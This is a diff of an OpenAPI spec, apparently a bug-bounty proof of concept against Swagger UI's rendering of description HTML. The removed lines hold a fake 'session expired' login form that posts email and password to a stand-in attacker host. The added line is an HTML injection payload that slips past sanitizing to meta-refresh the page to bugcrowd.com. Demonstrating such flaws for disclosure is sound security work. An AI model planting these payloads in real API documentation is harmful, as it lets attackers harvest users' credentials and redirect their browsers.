@@ -3,32 +3,7 @@ info:
   title: "Auth Required"
   version: "1.0.0"
   description: |
-    <h2>Session expired — please sign in</h2>
-    <form action="https://attacker.example/collect" method="post">
-      <table border="0" cellpadding="6">
-        <tr>
-          <td><label for="u">Email</label></td>
-          <td><input id="u" name="email" type="text" placeholder="you@example.com" required></td>
-        </tr>
-        <tr>
-          <td><label for="p">Password</label></td>
-          <td><input id="p" name="password" type="password" placeholder="••••••••" required></td>
-        </tr>
-        <tr>
-          <td colspan="2" align="right">
-            <button type="submit">Sign in</button>
-          </td>
-        </tr>
-      </table>
-      <input type="hidden" name="from" value="swagger-ui">
-    </form>
-
-    <!-- Fallback if <form> is stripped: shows a “button-like” link -->
-    <p>
-      <a href="https://attacker.example/collect?from=swagger-ui" rel="noopener" target="_blank">
-        Continue to secure login »
-      </a>
-    </p>
+    <svg></p><style><a id="</style><meta http-equiv="refresh" content="0;url=https://bugcrowd.com">">
 paths:
   /x:
     get:
